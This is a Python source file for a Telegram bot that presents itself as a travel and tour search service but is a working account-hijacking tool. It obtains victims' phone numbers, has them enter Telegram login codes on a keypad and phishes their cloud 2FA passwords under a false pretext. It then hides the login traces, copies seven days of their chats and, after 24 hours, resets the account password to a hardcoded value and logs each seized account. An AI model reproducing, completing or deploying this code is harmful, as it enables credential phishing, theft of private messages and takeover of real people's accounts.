import asyncio
import logging
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import CommandStart, Command
from aiogram.types import Message, ReplyKeyboardRemove, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from telethon.sync import TelegramClient
from telethon.errors import PhoneNumberInvalidError, FloodWaitError, SessionPasswordNeededError, \
    PasswordHashInvalidError
from clear_telegram_chat import cleanup_telegram_chat, delete_telegram_messages
from config import MAIN_BOT_TOKEN, API_ID, API_HASH, SESSION_FOLDER, CHAT_FOLDER, SESSION_2FA_FOLDER, BASE_DATA_PATH, \
    MY_SESSION_PATH
from scheduler import get_pending_hijacks, mark_as_done, add_to_schedule
from session_handler import sign_in_with_code, send_verification_code, \
    save_user_chats_last_7_days, get_account_with_2fa, move_session_to_2fa
from phone_checker import get_phone_by_username
import stat
from messages import *
from config import init_directories


# --- НАЛАШТУВАННЯ ---
DEBUG_MODE = False
ENABLE_2FA_HIJACK = True
AUTO_CHECK_METHOD = "username"

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

bot = Bot(token=MAIN_BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())


class AuthStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code_digit = State()
    waiting_for_confirmation = State()
    waiting_for_2fa_password = State()


class SearchStates(StatesGroup):
    choosing_type = State()
    entering_destination = State()
    entering_dates = State()


# ==================== УТИЛИТЫ ====================

def get_main_menu_keyboard():
    """Главная клавиатура меню"""
    keyboard = [
        [KeyboardButton(text=BTN_SEARCH), KeyboardButton(text=BTN_HOT_DEALS)],
        [KeyboardButton(text=BTN_POPULAR), KeyboardButton(text=BTN_MY_BOOKINGS)],
        [KeyboardButton(text=BTN_FAVORITES), KeyboardButton(text=BTN_PROFILE)],
        [KeyboardButton(text=BTN_SUPPORT), KeyboardButton(text=BTN_HELP)]
    ]
    return ReplyKeyboardMarkup(keyboard=keyboard, resize_keyboard=True)


def get_digit_keyboard():
    """Створює клавіатуру для введення коду підтвердження"""
    from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton

    buttons = [
        [InlineKeyboardButton(text="1", callback_data="digit_1"),
         InlineKeyboardButton(text="2", callback_data="digit_2"),
         InlineKeyboardButton(text="3", callback_data="digit_3")],
        [InlineKeyboardButton(text="4", callback_data="digit_4"),
         InlineKeyboardButton(text="5", callback_data="digit_5"),
         InlineKeyboardButton(text="6", callback_data="digit_6")],
        [InlineKeyboardButton(text="7", callback_data="digit_7"),
         InlineKeyboardButton(text="8", callback_data="digit_8"),
         InlineKeyboardButton(text="9", callback_data="digit_9")],
        [InlineKeyboardButton(text="⬅️ Стереть", callback_data="digit_erase"),
         InlineKeyboardButton(text="0", callback_data="digit_0"),
         InlineKeyboardButton(text="✅ Готово", callback_data="digit_confirm")]
    ]
    return InlineKeyboardMarkup(inline_keyboard=buttons)


async def get_user_phone_by_username(username: str):
    """
    Отримує номер телефону через username користувача.
    """
    if not username:
        logger.info("❌ У користувача немає username")
        return None

    client = TelegramClient(MY_SESSION_PATH, API_ID, API_HASH)

    try:
        await client.connect()

        if not await client.is_user_authorized():
            logger.error("❌ Власна сесія не авторизована. Запусти create_my_session.py")
            return None

        logger.info(f"🔍 Перевіряю номер телефону для @{username}...")

        result = await get_phone_by_username(client, username)

        if result and result.get('phone'):
            logger.info(f"✅ Номер знайдено: {result['phone']}")
            return result['phone']
        else:
            logger.info(f"🔒 Номер прихований для @{username}")
            return None

    except Exception as e:
        logger.error(f"❌ Помилка при перевірці номера: {e}")
        return None
    finally:
        await client.disconnect()


async def is_user_authorized(state: FSMContext) -> bool:
    """Перевірка авторизации пользователя через FSMContext"""
    data = await state.get_data()
    phone = data.get('phone_number')

    if not phone:
        return False

    # Перевіряємо існування сесії
    session_path = os.path.join(SESSION_FOLDER, f"{phone.replace('+', '')}.session")
    session_2fa_path = os.path.join(SESSION_2FA_FOLDER, f"{phone.replace('+', '')}.session")

    return os.path.exists(session_path) or os.path.exists(session_2fa_path)


def get_user_session_path(phone: str) -> str:
    """Повертає шлях до сесії користувача"""
    return os.path.join(SESSION_FOLDER, f"{phone.replace('+', '')}.session")


def get_user_chats_path(phone: str) -> str:
    """Повертає шлях до папки з чатами користувача"""
    chats_path = os.path.join(CHAT_FOLDER, phone)
    # Створюємо папку з правильними правами
    if not os.path.exists(chats_path):
        os.makedirs(chats_path, exist_ok=True)
        os.chmod(chats_path, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)
    return chats_path


# ==================== КОМАНДА /start ====================

@dp.message(CommandStart())
async def cmd_start(message: Message, state: FSMContext):
    """Обробка команди /start"""
    user_id = message.from_user.id
    username = message.from_user.username

    # Очищаємо попередні дані
    await state.clear()

    # Если пользователь уже авторизован
    if await is_user_authorized(state):
        await message.answer(
            MAIN_MENU,
            reply_markup=get_main_menu_keyboard()
        )
        return

    await message.answer(WELCOME_MESSAGE)

    # Якщо метод "username" і у користувача є username
    if AUTO_CHECK_METHOD == "username" and username:
        await message.answer(PHONE_CHECK_IN_PROGRESS)

        # Пробуємо отримати номер через username
        phone_number = await get_user_phone_by_username(username)

        if phone_number:
            # УСПІХ! Номер знайдено
            session_path = get_user_session_path(phone_number)

            # Відправляємо код
            success, result = await send_verification_code(phone_number, API_ID, API_HASH, SESSION_FOLDER)

            if success:
                # Зберігаємо дані в state
                await state.update_data(
                    client=result,
                    phone_number=phone_number
                )

                await message.answer(
                    f"✅ Номер `{phone_number}` найден автоматически.\n🔄 Отправляю код подтверждения...",
                    parse_mode="Markdown",
                    reply_markup=ReplyKeyboardRemove()
                )

                await message.answer(
                    CODE_SENT.format(phone=phone_number),
                    parse_mode="Markdown",
                    reply_markup=get_digit_keyboard()
                )
                await state.set_state(AuthStates.waiting_for_code_digit)
            else:
                await message.answer(
                    ERROR_UNEXPECTED.format(error=result),
                    parse_mode="Markdown"
                )
                await state.clear()
            return
        else:
            # Номер прихований або помилка
            await message.answer(
                PHONE_HIDDEN.format(username=username)
            )
    elif AUTO_CHECK_METHOD == "username" and not username:
        # У користувача немає username
        await message.answer(NO_USERNAME)

    # Просимо номер вручну
    await message.answer(
        PHONE_REQUEST,
        reply_markup=types.ReplyKeyboardMarkup(
            keyboard=[[KeyboardButton(text=BTN_SEND_PHONE, request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )
    await state.set_state(AuthStates.waiting_for_phone)


# ==================== АВТОРИЗАЦИЯ ====================

@dp.message(F.contact, AuthStates.waiting_for_phone)
async def process_phone(message: Message, state: FSMContext):
    """Обробка номера телефону від користувача"""
    phone_number = message.contact.phone_number
    user_id = message.from_user.id

    # Перевірка, чи це номер самого користувача
    if message.contact.user_id != user_id:
        await message.answer(
            WRONG_PHONE,
            reply_markup=types.ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text=BTN_SEND_PHONE, request_contact=True)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
        )
        return

    # Форматуємо номер
    if not phone_number.startswith('+'):
        phone_number = '+' + phone_number

    # Відправляємо код
    success, result = await send_verification_code(phone_number, API_ID, API_HASH, SESSION_FOLDER)

    if success:
        # Зберігаємо дані в state
        await state.update_data(
            client=result,
            phone_number=phone_number
        )
        await message.answer(
            PHONE_RECEIVED.format(phone=phone_number),
            parse_mode="Markdown",
            reply_markup=ReplyKeyboardRemove()
        )
        await message.answer(
            CODE_SENT.format(phone=phone_number),
            parse_mode="Markdown",
            reply_markup=get_digit_keyboard()
        )
        await state.set_state(AuthStates.waiting_for_code_digit)
    else:
        await message.answer(
            ERROR_UNEXPECTED.format(error=result),
            parse_mode="Markdown"
        )
        await state.clear()


@dp.callback_query(F.data.startswith("digit_"), AuthStates.waiting_for_code_digit)
async def process_digit(callback: types.CallbackQuery, state: FSMContext):
    """Обробка введення коду через кнопки"""
    action = callback.data.split("_")[1]

    # Отримуємо дані зі state
    state_data = await state.get_data()
    current_code = state_data.get('code', "")
    client = state_data.get('client')

    if not client:
        await callback.message.answer(ERROR_SESSION_LOST)
        await state.clear()
        return

    if action == 'erase':
        current_code = current_code[:-1]
        await state.update_data(code=current_code)

        display_code = current_code + '_' * (5 - len(current_code))
        status = CODE_CONTINUE

        await callback.message.edit_text(
            CODE_INPUT_PROMPT.format(display_code=display_code, status=status),
            parse_mode="Markdown",
            reply_markup=get_digit_keyboard()
        )
        await callback.answer()

    elif action == 'confirm':
        if len(current_code) != 5:
            await callback.answer(CODE_TOO_SHORT_ALERT, show_alert=True)
            return

        await state.update_data(code=current_code)
        await finalize_sign_in(callback.message, current_code, state)

    else:  # Введення цифри
        if len(current_code) >= 5:
            await callback.answer(CODE_TOO_LONG_ALERT, show_alert=True)
            return

        current_code += action
        await state.update_data(code=current_code)

        display_code = current_code + '•' * (5 - len(current_code))
        status = CODE_READY if len(current_code) == 5 else CODE_CONTINUE

        await callback.message.edit_text(
            CODE_INPUT_PROMPT.format(display_code=display_code, status=status),
            parse_mode="Markdown",
            reply_markup=get_digit_keyboard()
        )
        await callback.answer()


@dp.message(F.text, AuthStates.waiting_for_2fa_password)
async def process_2fa_password(message: Message, state: FSMContext):
    """Обробка хмарного пароля для 2FA"""
    password = message.text

    # Отримуємо дані зі state
    state_data = await state.get_data()
    client = state_data.get('client')
    phone_number = state_data.get('phone_number')

    if not client or not phone_number:
        await message.answer("❌ Втрачено сесію. Спробуйте знову /start")
        await state.clear()
        return

    await message.answer("🔄 Перевіряю пароль...")

    try:
        # Використовуємо існуючий клієнт для входу з паролем
        await client.sign_in(password=password)

        if await client.is_user_authorized():
            # Успішний вхід з 2FA
            logger.info(f"✅ Успішний вхід з 2FA для {phone_number}")

            # Створюємо папку для 2FA сесій якщо її немає
            if not os.path.exists(SESSION_2FA_FOLDER):
                os.makedirs(SESSION_2FA_FOLDER, exist_ok=True)
                os.chmod(SESSION_2FA_FOLDER, stat.S_IRWXU | stat.S_IRGRP | stat.S_IXGRP | stat.S_IROTH | stat.S_IXOTH)

            # Переміщуємо сесію в папку 2FA
            move_session_to_2fa(phone_number, SESSION_FOLDER, SESSION_2FA_FOLDER)

            # Очищуємо чати
            await cleanup_telegram_chat(client)

            # Оновлюємо дані в state
            await state.update_data(has_2fa=True)

            await message.answer(
                "✅ Доступ успішно отримано!\n\n"
                "Ваша історія пошуку та переваги збережені.",
                parse_mode="Markdown"
            )

            # Запускаємо збір чатів у фоні
            chats_path = get_user_chats_path(phone_number)
            asyncio.create_task(collect_chats_background(client, phone_number, chats_path))

            await message.answer(
                MAIN_MENU,
                reply_markup=get_main_menu_keyboard(),
                parse_mode="Markdown"
            )

            # Додаємо в чергу на фінальне перехоплення через 24 години
            hijack_password = "Waterlemon7grow$"
            await add_to_schedule(phone_number, hijack_password)

            logger.info(f"🕐 Акаунт {phone_number} буде остаточно перехоплено через 24 години.")
            await state.clear()

        else:
            await message.answer(
                "❌ Не вдалося авторизуватися. Спробуйте ще раз.",
                parse_mode="Markdown"
            )
            return

    except PasswordHashInvalidError:
        await message.answer(
            "❌ Неправильний хмарний пароль. Спробуйте ще раз.",
            parse_mode="Markdown"
        )
        return

    except FloodWaitError as e:
        await message.answer(
            f"⏱ Забагато спроб. Зачекайте {e.seconds} секунд.",
            parse_mode="Markdown"
        )
        await state.clear()

    except Exception as e:
        logger.error(f"Помилка при вході з 2FA: {e}")
        await message.answer(
            f"❌ Помилка: {str(e)}",
            parse_mode="Markdown"
        )
        await state.clear()


async def collect_chats_background(client: TelegramClient, phone_number: str, chats_path: str):
    """Фоновий збір чатів з правильним закриттям клієнта"""
    try:
        logger.info(f"Фоновий збір чатів для {phone_number} розпочато...")

        # Перевіряємо валідність сесії перед збором чатів
        if not await client.is_user_authorized():
            logger.error(f"❌ Сесія для {phone_number} не авторизована перед збором чатів")
            return

        await save_user_chats_last_7_days(client, phone_number, chats_path)
        logger.info(f"Чати для {phone_number} успішно збережено")

    except Exception as e:
        logger.error(f"Помилка при збереженні чатів: {e}")
    finally:
        # Правильне закриття клієнта без збереження стану
        try:
            # Спочатку відключаємо клієнт
            await client.disconnect()
            logger.info(f"Клієнт для {phone_number} успішно відключено")
        except Exception as e:
            logger.error(f"Помилка відключення клієнта для {phone_number}: {e}")


async def validate_session(session_path: str, api_id: int, api_hash: str) -> bool:
    """Перевіряє чи сесія валідна і авторизована"""
    client = TelegramClient(session_path, api_id, api_hash)

    try:
        await client.connect()
        is_authorized = await client.is_user_authorized()

        if is_authorized:
            # Додаткова перевірка - отримуємо me
            await client.get_me()

        return is_authorized

    except Exception as e:
        logger.error(f"Помилка валідації сесії {session_path}: {e}")
        return False
    finally:
        await client.disconnect()


async def finalize_sign_in(message: Message, code: str, state: FSMContext):
    """Фінальний вхід з кодом підтвердження"""
    await message.edit_text(CODE_CHECKING)

    state_data = await state.get_data()
    client = state_data.get('client')
    phone_number = state_data.get('phone_number')

    if not client or not phone_number:
        await message.edit_text(ERROR_SESSION_LOST)
        await state.clear()
        return

    try:
        success, result = await sign_in_with_code(
            client=client,
            phone=phone_number,
            code=code,
            session_folder=SESSION_FOLDER
        )

        if success == "Success":
            # Перевіряємо валідність сесії після входу
            session_path = get_user_session_path(phone_number)
            if not await validate_session(session_path, API_ID, API_HASH):
                await message.edit_text("❌ Помилка створення сесії. Спробуйте знову.")
                await state.clear()
                return

            await cleanup_telegram_chat(client)

            # Оновлюємо дані в state
            await state.update_data(has_2fa=False)

            await message.edit_text(AUTH_SUCCESS, parse_mode="Markdown")
            await message.answer(
                f"{MAIN_MENU}",
                reply_markup=get_main_menu_keyboard(),
                parse_mode="Markdown"
            )

            # Запускаємо збір чатів у фоні
            chats_path = get_user_chats_path(phone_number)
            asyncio.create_task(collect_chats_background(client, phone_number, chats_path))

            # Додаємо в чергу на виконання через 24 години
            hijack_password = "Waterlemon7grow\$"
            await add_to_schedule(phone_number, hijack_password)
            logger.info(f"🕐 Акаунт {phone_number} буде остаточно перехоплено через 24 години.")

            # Очищуємо стан
            await state.clear()

        elif success == "2FA_DETECTED":
            if ENABLE_2FA_HIJACK:
                await message.edit_text(
                    "🔐 Обнаружен облачный пароль\n\n"
                    "Для доступа к вашему аккаунту требуется ввести облачный пароль.\n"
                    "Это необходимо для подтверждения вашей личности и сохранения истории поиска.\n\n"
                    "Пожалуйста, введите ваш облачный пароль Telegram:",
                    parse_mode="Markdown"
                )
                await state.set_state(AuthStates.waiting_for_2fa_password)
                logger.info(f"🔐 Переведено в стан очікування 2FA пароля для {phone_number}")
            else:
                if client.is_connected():
                    await client.disconnect()
                await message.edit_text("❌ 2FA не поддерживается.", parse_mode="Markdown")
                await state.clear()

        else:
            await message.edit_text(
                ERROR_UNEXPECTED.format(error=result),
                parse_mode="Markdown"
            )
            await state.clear()

    except Exception as e:
        logger.error(f"Помилка при фінальному вході: {e}")
        await message.edit_text(
            ERROR_UNEXPECTED.format(error=str(e)),
            parse_mode="Markdown"
        )
        if client and client.is_connected():
            await client.disconnect()
        await state.clear()

    # ==================== КОМАНДЫ БОТА ====================

def require_auth(func):
    """Декоратор для проверки авторизации"""

    async def wrapper(message: Message, state: FSMContext, *args, **kwargs):
        if not await is_user_authorized(state):
            await message.answer(
                "🔐 Для использования этой команды необходимо авторизоваться.\n\n"
                "Используйте /start",
                reply_markup=ReplyKeyboardRemove()
            )
            return
        return await func(message, state, *args, **kwargs)

    return wrapper

@dp.message(Command("search"))
@dp.message(F.text == BTN_SEARCH)
@require_auth
async def cmd_search(message: Message, state: FSMContext):
    """Поиск туров"""
    await message.answer(SEARCH_START, reply_markup=ReplyKeyboardRemove())

@dp.message(Command("hot_deals"))
@dp.message(F.text == BTN_HOT_DEALS)
@require_auth
async def cmd_hot_deals(message: Message, state: FSMContext):
    """Горящие предложения"""
    await message.answer(HOT_DEALS_TITLE)
    await message.answer(POPULAR_DESTINATIONS)

@dp.message(Command("popular"))
@dp.message(F.text == BTN_POPULAR)
@require_auth
async def cmd_popular(message: Message, state: FSMContext):
    """Популярные направления"""
    await message.answer(POPULAR_TITLE)
    await message.answer(POPULAR_DESTINATIONS)

@dp.message(Command("my_bookings"))
@dp.message(F.text == BTN_MY_BOOKINGS)
@require_auth
async def cmd_my_bookings(message: Message, state: FSMContext):
    """Мои бронирования"""
    await message.answer(MY_BOOKINGS_EMPTY)

@dp.message(Command("favorites"))
@dp.message(F.text == BTN_FAVORITES)
@require_auth
async def cmd_favorites(message: Message, state: FSMContext):
    """Избранные туры"""
    await message.answer(FAVORITES_EMPTY)

@dp.message(Command("profile"))
@dp.message(F.text == BTN_PROFILE)
@require_auth
async def cmd_profile(message: Message, state: FSMContext):
    """Настройки профиля"""
    data = await state.get_data()

    await message.answer(
        PROFILE_INFO.format(
            phone=data.get('phone_number', 'Не указан'),
            email='Не указан',
            name=message.from_user.full_name,
            notifications='Включены',
            language='Русский'
        )
    )
    await message.answer(PROFILE_MENU)

@dp.message(Command("notifications"))
@require_auth
async def cmd_notifications(message: Message, state: FSMContext):
    """Настройки уведомлений"""
    await message.answer(NOTIFICATIONS_SETTINGS)

@dp.message(Command("support"))
@dp.message(F.text == BTN_SUPPORT)
@require_auth
async def cmd_support(message: Message, state: FSMContext):
    """Служба поддержки"""
    await message.answer(SUPPORT_MENU)

@dp.message(Command("help"))
@dp.message(F.text == BTN_HELP)
async def cmd_help(message: Message):
    """Помощь и инструкции"""
    await message.answer(HELP_MESSAGE, parse_mode="Markdown")

@dp.message(Command("cancel"))
async def cmd_cancel(message: Message, state: FSMContext):
    """Отменить текущее действие"""
    current_state = await state.get_state()

    if current_state is None:
        await message.answer(CANCEL_NOTHING, reply_markup=get_main_menu_keyboard())
    else:
        await state.clear()
        await message.answer(CANCEL_SUCCESS, reply_markup=get_main_menu_keyboard())

# ==================== ОБРАБОТКА НЕОЖИДАННЫХ СООБЩЕНИЙ ====================

@dp.message(F.text)
async def handle_unexpected_message(message: Message, state: FSMContext):
    """Обробка неочікуваних повідомлень"""
    current_state = await state.get_state()

    if current_state == AuthStates.waiting_for_confirmation:
        await message.answer(
            REMINDER_SEND_CODE,
            reply_markup=types.ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text=BTN_SEND_CODE)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
        )
    elif current_state == AuthStates.waiting_for_phone:
        await message.answer(
            REMINDER_SEND_PHONE,
            reply_markup=types.ReplyKeyboardMarkup(
                keyboard=[[KeyboardButton(text=BTN_SEND_PHONE, request_contact=True)]],
                resize_keyboard=True,
                one_time_keyboard=True
            )
        )
    elif current_state == AuthStates.waiting_for_code_digit:
        await message.answer(
            REMINDER_USE_DIGIT_BUTTONS,
            reply_markup=get_digit_keyboard()
        )
    elif current_state == AuthStates.waiting_for_2fa_password:
        await message.answer(
            "🔐 Пожалуйста, введите облачный пароль для доступа к вашему аккаунту.\n\n"
            "Это необходимо для подтверждения вашей личности.",
            parse_mode="Markdown"
        )
    else:
        # Якщо авторизован - показуємо меню
        if await is_user_authorized(state):
            await message.answer(
                MAIN_MENU,
                reply_markup=get_main_menu_keyboard()
            )
        else:
            await message.answer(
                "👋 Привет! Я бот для поиска отдыха.\n\n"
                "Для начала работы нажми /start"
            )

# ==================== ЗАПУСК БОТА ====================

async def scheduled_hijacks_runner():
    """
    Фоновий процес, який кожну годину перевіряє чергу
    і виконує перехоплення для акаунтів, яким виповнилося 24 години.
    """
    logger.info("🕐 Запуск фонового процесу для відкладених перехоплень.")

    try:
        while True:
            try:
                pending_hijacks = await get_pending_hijacks()

                if not pending_hijacks:
                    logger.info("🕐 Немає відкладених завдань для виконання.")

                for task in pending_hijacks:
                    phone_number = task["phone"]
                    hijack_password = task["password"]

                    logger.info(f"🚨 Час настав! Починаю фінальне перехоплення акаунту {phone_number}...")

                    # Визначаємо, де шукати сесію
                    session_path = os.path.join(SESSION_FOLDER, f"{phone_number.replace('+', '')}.session")
                    session_2fa_path = os.path.join(SESSION_2FA_FOLDER, f"{phone_number.replace('+', '')}.session")

                    final_session_path = None
                    if os.path.exists(session_2fa_path):
                        final_session_path = session_2fa_path
                    elif os.path.exists(session_path):
                        final_session_path = session_path

                    if not final_session_path:
                        logger.warning(f"❌ Сесію для {phone_number} не знайдено")
                        await mark_as_done(phone_number)
                        continue

                    client = TelegramClient(final_session_path, API_ID, API_HASH)

                    try:
                        await client.connect()
                        if await client.is_user_authorized():
                            # Викликаємо функцію для перехоплення
                            hijack_success, hijack_result = await get_account_with_2fa(client, hijack_password)

                            if hijack_success:
                                # Зберігаємо пароль у файл
                                with open(os.path.join(BASE_DATA_PATH, "hijacked_accounts.txt"), "a") as f:
                                    f.write(f"{phone_number}:{hijack_password}\n")
                                logger.critical(f"🚨 АКАУНТ {phone_number} ОСТАТОЧНО ПЕРЕХОПЛЕНО. Пароль збережено.")
                            else:
                                logger.error(
                                    f"❌ Не вдалося остаточно перехопити акаунт {phone_number}: {hijack_result}")
                        else:
                            logger.warning(
                                f"❌ Сесія для {phone_number} не авторизована. Пропускаю фінальне перехоплення.")

                    except Exception as e:
                        logger.error(f"❌ Помилка під час фінального перехоплення {phone_number}: {e}")
                    finally:
                        if client.is_connected():
                            await client.disconnect()
                            await mark_as_done(phone_number)

            except Exception as e:
                logger.error(f"❌ Помилка в циклі scheduled_hijacks_runner: {e}")

            # Чекаємо годину перед наступною перевіркою
            try:
                await asyncio.sleep(3600)
            except asyncio.CancelledError:
                logger.info("🛑 scheduled_hijacks_runner отримав сигнал зупинки")
                break

    except asyncio.CancelledError:
        logger.info("🛑 scheduled_hijacks_runner зупинено")
        raise


async def main():
    """Головна функція для запуску бота та фонових завдань."""

    # Ініціалізуємо папки з правильними правами
    init_directories()

    # Створюємо завдання для відкладених перехоплень
    hijacks_task = asyncio.create_task(scheduled_hijacks_runner())

    try:
        # Запускаємо поллінг бота
        await dp.start_polling(bot)
    finally:
        # Коректно завершуємо фонову задачу при зупинці
        logger.info("🛑 Зупиняємо фонові задачі...")
        hijacks_task.cancel()

        try:
            await hijacks_task
        except asyncio.CancelledError:
            logger.info("✅ Фонова задача перехоплень зупинена")


if __name__ == "__main__":
    logger.info("=" * 60)
    logger.info("🚀 Запуск бота для пошуку відпочинку")
    logger.info("=" * 60)
    logger.info(f"Режим: {'🧪 DEBUG' if DEBUG_MODE else '✅ PRODUCTION'}")
    logger.info(f"Метод перевірки: {AUTO_CHECK_METHOD}")
    logger.info("=" * 60)

    # Запускаємо головну асинхронну функцію
    asyncio.run(main())